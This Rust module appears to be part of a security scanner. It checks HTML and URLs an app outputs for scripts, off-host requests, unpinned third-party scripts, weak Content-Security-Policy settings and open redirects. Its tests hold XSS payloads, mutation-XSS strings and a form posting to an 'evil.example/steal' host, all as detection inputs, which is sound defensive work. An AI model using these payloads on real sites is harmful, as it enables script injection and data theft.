//! Output labels: what the platform allows in the export's result.
//!
//! `html:no-scripts`: no script runs from this markup (no `<script>`, no
//! event handler of any framework, no `javascript:` URL). `html:safe`: no
//! scripts, and the markup makes no request the user didn't ask for to
//! another host or to a sensitive route (no meta refresh, no form off the
//! app, nothing loaded from another host, nothing that fires by itself).
//! `html:scripts`: scripts may run, but they come from the app's origin or
//! from granted hosts with an `integrity` hash, a Content-Security-Policy
//! keeps them on the app's origin and the granted hosts, and the markup
//! itself makes no request `html:safe` forbids.
//! `url:local`: a path on the app's own host, so `//evil`, `/\evil` and
//! schemes fail.
//!
//! The browser model is static and knows no framework: standard HTML
//! attributes by their meaning, every other attribute by the shape of its
//! value (see `urls::in_html`). Names that look like handlers (`on…`,
//! `@…`, `…on:…`, `(…)`) count as handlers.

use std::sync::LazyLock;

use regex::Regex;
use serde::{Deserialize, Serialize};
use serde_json::{Value, json};

use crate::detect::{Finding, Severity};
use crate::harness::field;
use crate::html::doc;
use crate::manifest::Manifest;
use crate::record::RunRecord;
use crate::urls::{classify, in_html, normalize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum OutputLabel {
    #[serde(rename = "html:no-scripts")]
    HtmlNoScripts,
    #[serde(rename = "html:safe")]
    HtmlSafe,
    #[serde(rename = "html:scripts")]
    HtmlScripts,
    #[serde(rename = "url:local")]
    UrlLocal,
}

impl OutputLabel {
    pub fn name(self) -> &'static str {
        match self {
            OutputLabel::HtmlNoScripts => "html:no-scripts",
            OutputLabel::HtmlSafe => "html:safe",
            OutputLabel::HtmlScripts => "html:scripts",
            OutputLabel::UrlLocal => "url:local",
        }
    }
}

/// Tags that run or embed active content.
const ACTIVE_TAGS: &[&str] = &["script", "object", "embed", "applet"];
/// Attributes whose value is text for people, never code.
const TEXT_ATTRS: &[&str] = &["class", "id", "title", "alt", "name", "type", "value", "placeholder", "content", "label", "lang", "style", "role", "for"];
/// A call (`f(…)`, `a.b(…)`), an arrow function, or a `js:` prefix.
static CODE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)^\s*js:|[A-Za-z_$][\w$.]*\s*\([^)]*\)|=>").unwrap());

/// Something found in the markup: what, the tag, how bad.
#[derive(Debug, Clone)]
pub struct Hit {
    pub what: String,
    pub tag: String,
    pub severity: Severity,
}

fn hit(what: String, tag: &str, severity: Severity) -> Hit {
    Hit { what, tag: tag.to_string(), severity }
}

/// Whether an attribute name looks like an event handler in some
/// framework: `onclick`, `@click`, `x-on:click`, `hx-on::after`,
/// `v-on:click`, `(click)`, `data-on-click`.
pub(crate) fn is_handler(k: &str) -> bool {
    let k = k.strip_prefix("data-").unwrap_or(k);
    if k.starts_with('@') || k.starts_with('(') {
        return true;
    }
    if k.len() > 2 && k.starts_with("on") && k[2..].chars().all(|c| c.is_ascii_alphabetic()) {
        return true;
    }
    let w: Vec<&str> = k.split(['-', ':', '.', '_']).collect();
    w.iter().enumerate().any(|(i, x)| *x == "on" && i + 1 < w.len())
}

/// Whether a framework reads an attribute's value as an expression:
/// Alpine and Vue (`x-…`, `v-…`, `:…`), Angular (`ng-…`, `[…]`, `*…`).
pub(crate) fn is_expression(k: &str) -> bool {
    let k = k.strip_prefix("data-").unwrap_or(k);
    // Names, class lists and markers, not expressions.
    const NOT: &[&str] = &["x-cloak", "x-ref", "x-teleport", "x-ignore", "v-cloak", "v-pre", "v-once", "ng-cloak", "ng-non-bindable"];
    if NOT.contains(&k) || k.starts_with("x-transition") {
        return false;
    }
    k.starts_with(':') || k.starts_with('[') || k.starts_with('*') || ["x-", "v-", "ng-"].iter().any(|p| k.starts_with(p))
}

/// Ways the markup can run a script.
pub fn scripts(html: &str) -> Vec<Hit> {
    let mut out = Vec::new();
    for t in &doc(html).elements {
        if ACTIVE_TAGS.contains(&t.name.as_str()) {
            out.push(hit(format!("a <{}> element", t.name), &t.raw, Severity::Fail));
            continue;
        }
        if t.name == "iframe" && t.get("srcdoc").is_some() {
            out.push(hit("an iframe with srcdoc".into(), &t.raw, Severity::Fail));
        }
        for (k, v) in &t.attrs {
            let v = normalize(v);
            if is_handler(k) {
                out.push(hit(format!("an event handler ({k})"), &t.raw, Severity::Fail));
            } else if k == "content" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
                if let Some(i) = v.to_ascii_lowercase().find("url=")
                    && script_url(&v[i + 4..])
                {
                    out.push(hit("a meta refresh to a script URL".into(), &t.raw, Severity::Fail));
                }
            } else if script_url(&v) {
                out.push(hit(format!("a script URL in {k}"), &t.raw, Severity::Fail));
            } else if v.trim_start().to_ascii_lowercase().starts_with("js:") {
                out.push(hit(format!("script in {k}"), &t.raw, Severity::Fail));
            } else if !TEXT_ATTRS.contains(&k.as_str()) && !k.starts_with("aria-") && CODE.is_match(&v) {
                // A framework may run it.
                out.push(hit(format!("an attribute that looks like code ({k})"), &t.raw, Severity::Warn));
            }
        }
    }
    out
}

fn script_url(v: &str) -> bool {
    let u = normalize(v).to_ascii_lowercase();
    let kind = classify(&u).0;
    kind == "javascript" || u.starts_with("data:text/html") || u.starts_with("data:application/xhtml") || u.starts_with("data:image/svg")
}

/// Requests the markup makes that the user didn't ask for, or makes to
/// another host or a sensitive route.
///
/// With `scripts` allowed, where scripts load from and what they fetch
/// from other hosts is for `unpinned_scripts` and the
/// Content-Security-Policy. A sensitive route named in a script stays a
/// warn: the static check can't see whether it is called.
pub fn unsafe_actions(html: &str, sensitive: &[String], scripts: bool) -> Vec<Hit> {
    let mut out = Vec::new();
    let d = doc(html);
    let script_tags: Vec<&str> = if scripts { script_loads(&d).into_iter().map(|(_, e)| e.raw.as_str()).collect() } else { Vec::new() };
    // With scripts allowed, an attribute of no standard meaning (htmx,
    // Alpine, Turbo, data-*) is read by a script, which then requests it.
    let by_script = |f: &crate::urls::Found| {
        scripts
            && (f.source == "script"
                || is_handler(&f.source)
                || is_expression(&f.source)
                || script_tags.contains(&f.tag.as_str())
                || matches!(f.trigger.as_str(), "unknown" | "auto"))
    };
    let is_sensitive = |u: &str| {
        let path = u.split(['?', '#']).next().unwrap_or(u);
        sensitive.iter().find(|s| path == s.as_str() || path.starts_with(&format!("{}/", s.trim_end_matches('/'))))
    };
    for t in &doc(html).elements {
        if t.name == "meta" && t.get("http-equiv").is_some_and(|h| h.eq_ignore_ascii_case("refresh")) {
            out.push(hit("a meta refresh (the page moves on by itself)".into(), &t.raw, Severity::Fail));
        }
    }
    // A URL joined from pieces counts only where the element shows nothing
    // else: pieces join into noise too.
    let mut shown: Vec<String> = Vec::new();
    for f in in_html(html) {
        if f.source == "joined" && shown.contains(&f.tag) {
            continue;
        }
        let before = out.len();
        let u = normalize(&f.url);
        let kind = classify(&u).0;
        if matches!(kind.as_str(), "javascript" | "data" | "mailto") {
            continue;
        }
        let short: String = u.chars().take(80).collect();
        let (k, off) = (&f.source, kind != "same_host");
        if by_script(&f) {
            if let Some(s) = is_sensitive(&u).filter(|_| !off) {
                out.push(hit(format!("a script that names the sensitive route {s} ({k} = {short})"), &f.tag, Severity::Warn));
            }
            continue;
        }
        let what = match f.trigger.as_str() {
            "form" => "a form",
            "load" => "a load",
            "unknown" | "auto" => "a request in an attribute of no standard meaning",
            // Links are the user's choice; refresh is reported above.
            _ => continue,
        };
        if off {
            out.push(hit(format!("{what} to {short} ({k}, {kind})"), &f.tag, Severity::Fail));
        } else if let Some(s) = is_sensitive(&u) {
            out.push(hit(format!("{what} to the sensitive route {s} ({k} = {short})"), &f.tag, Severity::Fail));
        } else if f.trigger == "auto" {
            out.push(hit(format!("a request that fires by itself ({k} = {short})"), &f.tag, Severity::Fail));
        }
        if out.len() > before {
            shown.push(f.tag.clone());
        }
    }
    out
}

/// Elements that load a script, with the URL: `<script src>`, `<link
/// rel=modulepreload>` and `<link rel=preload as=script>`.
fn script_loads(doc: &crate::html::Doc) -> Vec<(&str, &crate::html::Element)> {
    let mut out = Vec::new();
    for e in &doc.elements {
        let rel = e.get("rel").unwrap_or("").to_ascii_lowercase();
        let rel: Vec<&str> = rel.split_ascii_whitespace().collect();
        let preload = rel.contains(&"modulepreload") || (rel.contains(&"preload") && e.get("as").is_some_and(|a| a.eq_ignore_ascii_case("script")));
        let url = match e.name.as_str() {
            "script" => e.get("src"),
            "link" if preload => e.get("href"),
            _ => None,
        };
        if let Some(u) = url {
            out.push((u, e));
        }
    }
    out
}

/// `import "…"`, `import x from "…"`, `import("…")`, `export … from "…"`.
static IMPORT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r#"\b(?:import|from)\s*\(?\s*["'`]([^"'`\s]+)["'`]"#).unwrap());

/// Scripts the markup loads from another host without pinning them to
/// what was reviewed: from a host the grants don't list, or without an
/// `integrity` hash (for module imports: in the import map or a
/// `modulepreload` link).
pub fn unpinned_scripts(html: &str, hosts: &[String]) -> Vec<(String, Hit)> {
    let doc = doc(html);
    let mut out = Vec::new();
    // Import map: bare names to URLs, URLs to hashes.
    let (mut imports, mut hashes) = (serde_json::Map::new(), serde_json::Map::new());
    for e in doc.elements.iter().filter(|e| e.name == "script" && e.get("type").is_some_and(|t| t.trim().eq_ignore_ascii_case("importmap"))) {
        if let Some(Ok(Value::Object(map))) = e.body.as_deref().map(serde_json::from_str::<Value>) {
            imports.extend(map.get("imports").and_then(Value::as_object).cloned().unwrap_or_default());
            hashes.extend(map.get("integrity").and_then(Value::as_object).cloned().unwrap_or_default());
        }
    }
    let loads = script_loads(&doc);
    for (u, e) in &loads {
        let pinned = e.get("integrity").is_some_and(|i| !i.trim().is_empty()) || hashes.get(*u).and_then(Value::as_str).is_some_and(|h| !h.trim().is_empty());
        if let Some((host, what)) = unpinned(u, pinned, hosts) {
            out.push((host, hit(what, &e.raw, Severity::Fail)));
        }
    }
    for e in doc.elements.iter().filter(|e| e.name == "script" && e.get("src").is_none()) {
        let Some(code) = e.body.as_deref() else { continue };
        for c in IMPORT.captures_iter(code) {
            let spec = &c[1];
            let url = imports.get(spec).and_then(Value::as_str).unwrap_or(spec);
            if !(url.contains("://") || url.starts_with("//")) {
                continue;
            }
            let pinned = hashes.get(url).and_then(Value::as_str).is_some_and(|h| !h.trim().is_empty())
                || loads.iter().any(|(l, p)| *l == url && p.get("integrity").is_some_and(|i| !i.trim().is_empty()));
            if let Some((host, what)) = unpinned(url, pinned, hosts) {
                out.push((host, hit(format!("{what} (imported)"), "<script>", Severity::Fail)));
            }
        }
    }
    out
}

/// Why a script from `u` is not pinned, if it isn't: (host, why).
fn unpinned(u: &str, integrity: bool, hosts: &[String]) -> Option<(String, String)> {
    let (kind, host, _) = classify(&normalize(u));
    let host = host?;
    let short: String = u.chars().take(80).collect();
    if kind == "same_host" {
        None
    } else if !crate::dest::granted(&host, hosts) {
        Some((host, format!("a script from {short}, a host the grants don't list")))
    } else if !integrity {
        Some((host, format!("a script from {short} without an integrity hash")))
    } else {
        None
    }
}

/// Whether a URL is a path on the app's own host.
pub fn is_local(u: &str) -> bool {
    let n = normalize(u);
    classify(&n).0 == "same_host" && !n.contains("\\") && !n.to_ascii_lowercase().starts_with("/%2f") && !n.to_ascii_lowercase().starts_with("/%5c")
}

/// Output label findings of one run.
pub fn check(r: &RunRecord, m: &Manifest) -> Vec<Finding> {
    let Some(entry) = m.entry.as_ref().filter(|e| !e.result.is_empty()) else { return Vec::new() };
    let Some(result) = &r.result else { return Vec::new() };
    let ex = &r.spec.export;
    let run = Some(r.id.as_str());
    let req = request_texts(r);
    let resp = crate::output::response(r, m);
    let mut out = Vec::new();
    for (path, label) in &entry.result {
        let Some(Value::String(v)) = field(result, path) else { continue };
        // A body whose content type says it isn't HTML (the page's script,
        // its style, JSON): a browser doesn't read it as markup.
        if *label != OutputLabel::UrlLocal && entry.output.body.as_deref() == Some(path.as_str()) && !resp.html {
            continue;
        }
        let from_req = |s: &str| req.iter().find(|q| s.contains(q.as_str())).cloned();
        match label {
            OutputLabel::HtmlScripts => {
                for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths, true) {
                    out.push(Finding::new(
                        "unsafe_action",
                        &format!("{ex}\0{path}\0{}", what.split(' ').take(4).collect::<Vec<_>>().join(" ")),
                        severity,
                        format!("{path} is labelled html:scripts but holds {what}"),
                        json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                        run,
                    ));
                }
                out.extend(unpinned_findings(r, m, path, v, Severity::Fail));
                if scripts(v).is_empty() {
                    continue;
                }
                // The policies that apply: the response's, the markup's, the platform's.
                let metas: Vec<String> = doc(v)
                    .elements
                    .iter()
                    .filter(|e| e.name == "meta" && e.get("http-equiv").is_some_and(|h| h.trim().eq_ignore_ascii_case("content-security-policy")))
                    .filter_map(|e| e.get("content").map(str::to_string))
                    .collect();
                let mut policies: Vec<&str> =
                    resp.headers.iter().filter(|(n, _)| n.eq_ignore_ascii_case("content-security-policy")).map(|(_, v)| v.as_str()).collect();
                policies.extend(metas.iter().map(String::as_str));
                policies.extend(entry.csp.as_deref());
                let hosts = m.grants.hosts.clone().unwrap_or_default();
                let weak = crate::csp::weaknesses(&policies, &hosts);
                for (severity, list) in
                    [Severity::Fail, Severity::Warn].map(|s| (s, weak.iter().filter(|(w, _)| *w == s).map(|(_, t)| t.as_str()).collect::<Vec<_>>()))
                {
                    let Some(first) = list.first() else { continue };
                    let more = if list.len() > 1 { format!(" (and {} more)", list.len() - 1) } else { String::new() };
                    out.push(Finding::new(
                        "weak_csp",
                        &format!("{ex}\0{path}\0{severity:?}"),
                        severity,
                        format!("{path} is labelled html:scripts and runs scripts, but its Content-Security-Policy {first}{more}"),
                        json!({"path": path, "label": label.name(), "problems": list, "policies": policies}),
                        run,
                    ));
                }
            }
            OutputLabel::HtmlNoScripts | OutputLabel::HtmlSafe => {
                for Hit { what, tag, severity } in scripts(v) {
                    out.push(Finding::new(
                        "script_in_output",
                        &format!("{ex}\0{path}\0{}", what.split(' ').take(3).collect::<Vec<_>>().join(" ")),
                        severity,
                        format!(
                            "{path} is labelled {} but holds {what}{}",
                            label.name(),
                            from_req(&tag).map(|_| ", with text from the request").unwrap_or_default()
                        ),
                        json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                        run,
                    ));
                }
                if *label != OutputLabel::HtmlNoScripts {
                    for Hit { what, tag, severity } in unsafe_actions(v, &entry.sensitive_paths, *label == OutputLabel::HtmlScripts) {
                        out.push(Finding::new(
                            "unsafe_action",
                            &format!("{ex}\0{path}\0{}", what.split(' ').take(4).collect::<Vec<_>>().join(" ")),
                            severity,
                            format!("{path} is labelled {} but holds {what}", label.name()),
                            json!({"path": path, "label": label.name(), "what": what, "tag": tag, "from_request": from_req(&tag)}),
                            run,
                        ));
                    }
                }
            }
            OutputLabel::UrlLocal => {
                if v.is_empty() || is_local(v) {
                    continue;
                }
                let (kind, sev, how) = match from_req(v) {
                    Some(q) => ("open_redirect", Severity::Fail, format!("; it comes from the request ({q:?})")),
                    None => ("non_local_url", Severity::Warn, String::new()),
                };
                out.push(Finding::new(
                    kind,
                    &format!("{ex}\0{path}"),
                    sev,
                    format!("{path} is labelled url:local but is {:?} ({}){how}", v.chars().take(80).collect::<String>(), classify(&normalize(v)).0),
                    json!({"path": path, "label": label.name(), "value": v, "kind": classify(&normalize(v)).0}),
                    run,
                ));
            }
        }
    }
    out
}

/// `unpinned_script` findings for the markup at `path`.
pub(crate) fn unpinned_findings(r: &RunRecord, m: &Manifest, path: &str, html: &str, severity: Severity) -> Vec<Finding> {
    let hosts = m.grants.hosts.clone().unwrap_or_default();
    let ex = &r.spec.export;
    unpinned_scripts(html, &hosts)
        .into_iter()
        .map(|(host, Hit { what, tag, .. })| {
            Finding::new(
                "unpinned_script",
                &format!("{ex}\0{path}\0{host}"),
                severity,
                format!("{path} loads {what}: the code can change after the review"),
                json!({"path": path, "what": what, "tag": tag}),
                Some(r.id.as_str()),
            )
        })
        .collect()
}

/// Strings in the request a user could have chosen (4 characters or more).
fn request_texts(r: &RunRecord) -> Vec<String> {
    fn walk(v: &Value, out: &mut Vec<String>) {
        match v {
            Value::String(s) if s.chars().count() >= 4 => out.push(s.clone()),
            Value::Array(a) => a.iter().for_each(|x| walk(x, out)),
            Value::Object(o) => o.values().for_each(|x| walk(x, out)),
            _ => {}
        }
    }
    let mut out = Vec::new();
    r.spec.args.iter().for_each(|a| walk(a, &mut out));
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::record::{Outcome, OutcomeKind, RunSpec, Totals};

    fn whats(v: Vec<Hit>) -> Vec<String> {
        v.into_iter().map(|h| h.what).collect()
    }

    fn served(body: &str, content_type: &str) -> RunRecord {
        let spec = RunSpec {
            component: String::new(),
            contract: String::new(),
            export: "h".into(),
            args: vec![],
            plan: Default::default(),
            now: String::new(),
            seed: 0,
            fuel: 0,
            memory: 0,
            ns_per_fuel: 0.0,
        };
        RunRecord {
            id: "r1".into(),
            spec,
            outcome: Outcome { kind: OutcomeKind::Ok, message: None, stack: vec![] },
            result: Some(json!({"status": 200, "body": body, "headers": [["content-type", content_type]]})),
            totals: Totals::default(),
            events: vec![],
            guest_error: None,
            rejected_output: None,
            memory_limit_hit: false,
            capture_limited: false,
            stdout: String::new(),
            stderr: String::new(),
            command_exit_code: None,
        }
    }

    /// The page's script or style, served by the app, is no markup, even
    /// where the manifest's `body_format` says html: its content type
    /// decides, as in a browser.
    #[test]
    fn a_script_the_app_serves_is_not_markup() {
        let m: Manifest = toml::from_str(
            r#"
            [app]
            wasm = "a.wasm"
            [entry]
            export = "h"
            output = { status = "status", body = "body", headers = "headers", body_format = "html" }
            result = { body = "html:scripts" }
            "#,
        )
        .unwrap();
        let js = r#"document.createElementNS("http://www.w3.org/2000/svg", "svg"); const t = "<img src=https://x.example/p.gif>";"#;
        let script = served(js, "text/javascript");
        assert!(check(&script, &m).is_empty());
        assert!(crate::urls::extract_output(&script, &m).iter().all(|u| u.trigger == "text"));
        // Served as HTML, the same text is markup with an image that loads.
        let page = served(js, "text/html");
        assert!(!check(&page, &m).is_empty());
        assert!(crate::urls::extract_output(&page, &m).iter().any(|u| u.trigger == "load"));
    }

    #[test]
    fn finds_scripts() {
        assert!(scripts("<p class=x>Hi <a href=\"/a\">a</a></p>").is_empty());
        assert_eq!(whats(scripts("<SCRIPT>alert(1)</SCRIPT>")), ["a <script> element"]);
        assert_eq!(whats(scripts("<img src=x OnError=alert(1)>")), ["an event handler (onerror)"]);
        assert_eq!(whats(scripts("<a href=\"jav&#x09;ascript&colon;alert(1)\">x</a>")), ["a script URL in href"]);
        // Handlers of any framework, by the shape of the name.
        for h in ["hx-on:click", "x-on:click", "@click", "v-on:submit", "(click)", "data-on-click", "hx-on::after-request"] {
            assert_eq!(whats(scripts(&format!("<button {h}=\"go()\">x</button>"))), [format!("an event handler ({h})")], "{h}");
        }
        assert_eq!(whats(scripts("<div hx-vals='js:{a: evil()}'></div>")), ["script in hx-vals"]);
        assert_eq!(whats(scripts("<div data-url=\"javascript:evil()\"></div>")), ["a script URL in data-url"]);
        // Code-shaped values in other attributes: a framework may run them.
        let h = scripts("<div x-init=\"fetch('/x')\"></div>");
        assert_eq!((h[0].what.as_str(), h[0].severity), ("an attribute that looks like code (x-init)", Severity::Warn));
        assert!(scripts("<div hx-vals='{\"a\": 1}' title=\"call (555) 123\" x-show=\"open\" data-on=\"x\"></div>").is_empty());
    }

    #[test]
    fn reads_markup_as_a_browser_does() {
        // Markup a browser runs, though a reader by patterns sees none.
        for runs in [
            r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#,
            "<svg><style><img src=x onerror=alert(1)></style></svg>",
            "<math><style><img src=x onerror=alert(1)></style></math>",
            r#"<p title=a"b onclick=alert(1)>"#,
            r#"<a href="javas&#99ript:alert(1)">x</a>"#,
        ] {
            let h = scripts(runs);
            assert!(h.iter().any(|h| h.severity == Severity::Fail), "{runs}: {:?}", whats(h));
        }
        // Markup a browser shows as text.
        for inert in
            ["<!-- <img src=x onerror=alert(1)> -->", "<textarea><img src=x onerror=alert(1)></textarea>", "<title><img src=x onerror=alert(1)></title>"]
        {
            assert!(scripts(inert).is_empty(), "{inert}");
        }
    }

    #[test]
    fn finds_unsafe_actions() {
        let s = vec!["/admin".to_string()];
        let n = |h: &str| unsafe_actions(h, &s, false).len();
        assert_eq!(n("<form method=post action=\"/order\"><button>x</button></form>"), 0);
        assert_eq!(n("<a href=\"https://other.example/\">x</a>"), 0);
        assert_eq!(n("<form action=\"https://evil.example/steal\">"), 1);
        assert_eq!(n("<meta http-equiv=\"refresh\" content=\"0;url=/x\">"), 1);
        // htmx, Alpine, Turbo, data attributes: one rule.
        assert_eq!(n("<button hx-post=\"/admin/users/7/delete\">x</button>"), 1);
        assert_eq!(n("<div hx-get=\"/feed\" hx-trigger=\"load\"></div>"), 1);
        assert_eq!(n("<div hx-get=\"/feed\" hx-trigger=\"click\"></div>"), 0);
        assert_eq!(n("<div x-init=\"fetch('/admin/wipe')\"></div>"), 1);
        assert_eq!(n("<div x-intersect=\"$fetch('/feed')\"></div>"), 1);
        assert_eq!(n("<turbo-frame src=\"https://evil.example/f\"></turbo-frame>"), 1);
        assert_eq!(n("<img src=\"https://t.example/p.gif\">"), 1);
        assert_eq!(n("<img src=\"/logo.png\">"), 0);
        assert_eq!(n("<div data-endpoint=\"/admin/x\"></div>"), 1);
        assert_eq!(n("<script>navigator.sendBeacon('https://c.example/p')</script>"), 1);
        // With scripts allowed, what scripts fetch is for the CSP (and for
        // probe scripts, which runs them); a sensitive route they name
        // stays a warn. Framework attributes are what scripts fetch.
        let w = |h: &str| unsafe_actions(h, &s, true).iter().map(|h| h.severity).collect::<Vec<_>>();
        assert_eq!(w("<script>navigator.sendBeacon('https://c.example/p')</script>"), []);
        assert_eq!(w("<script src=\"https://cdn.example/a.js\"></script>"), []);
        assert_eq!(w("<div x-init=\"fetch('/admin/wipe')\"></div>"), [Severity::Warn]);
        assert_eq!(w("<div hx-get=\"/feed\" hx-trigger=\"load\"></div>"), []);
        assert_eq!(w("<button hx-post=\"/admin/users/7/delete\">x</button>"), [Severity::Warn]);
        // A src loads, whoever loads it.
        assert_eq!(w("<turbo-frame src=\"https://evil.example/f\"></turbo-frame>"), [Severity::Fail]);
        assert_eq!(w("<img src=\"https://t.example/p.gif\">"), [Severity::Fail]);
        assert_eq!(w("<form action=\"https://evil.example/steal\">"), [Severity::Fail]);
    }

    #[test]
    fn finds_unpinned_scripts() {
        let hosts = vec!["cdn.example".to_string()];
        let n = |h: &str| unpinned_scripts(h, &hosts).into_iter().map(|(_, h)| h.what).collect::<Vec<_>>();
        assert_eq!(n("<script src=\"/app.js\"></script><script type=module src=\"./m.js\"></script>"), Vec::<String>::new());
        assert_eq!(n("<script src=\"https://cdn.example/a.js\" integrity=\"sha384-x\"></script>"), Vec::<String>::new());
        assert_eq!(n("<script src=\"https://cdn.example/a.js\"></script>"), ["a script from https://cdn.example/a.js without an integrity hash"]);
        assert_eq!(
            n("<script src=\"//evil.example/a.js\" integrity=\"sha384-x\"></script>"),
            ["a script from //evil.example/a.js, a host the grants don't list"]
        );
        assert_eq!(n("<link rel=modulepreload href=\"https://cdn.example/m.js\">").len(), 1);
        assert_eq!(n("<link rel=preload as=script href=\"https://cdn.example/m.js\">").len(), 1);
        assert_eq!(n("<link rel=preload as=style href=\"https://cdn.example/m.css\">").len(), 0);
        // Module imports: directly, or through the import map.
        assert_eq!(n("<script type=module>import { a } from 'https://cdn.example/m.js'; a()</script>").len(), 1);
        let map =
            r#"<script type="importmap">{"imports": {"lit": "https://cdn.example/lit.js"}, "integrity": {"https://cdn.example/lit.js": "sha384-x"}}</script>"#;
        assert_eq!(n(&format!("{map}<script type=module>import {{ html }} from 'lit'; import('lit')</script>")), Vec::<String>::new());
        let map = r#"<script type="importmap">{"imports": {"lit": "https://cdn.example/lit.js"}}</script>"#;
        assert_eq!(n(&format!("{map}<script type=module>import {{ html }} from 'lit'</script>")).len(), 1);
        assert_eq!(n("<script>const a = Array.from('abc'); import('./local.js')</script>"), Vec::<String>::new());
    }

    #[test]
    fn local_urls() {
        assert!(is_local("/orders/7?x=1"));
        assert!(is_local("orders"));
        assert!(!is_local("//evil.example/"));
        assert!(!is_local("/\\evil.example"));
        assert!(!is_local("https://evil.example/"));
        assert!(!is_local("javascript:alert(1)"));
        assert!(!is_local("\t//evil.example"));
    }
}
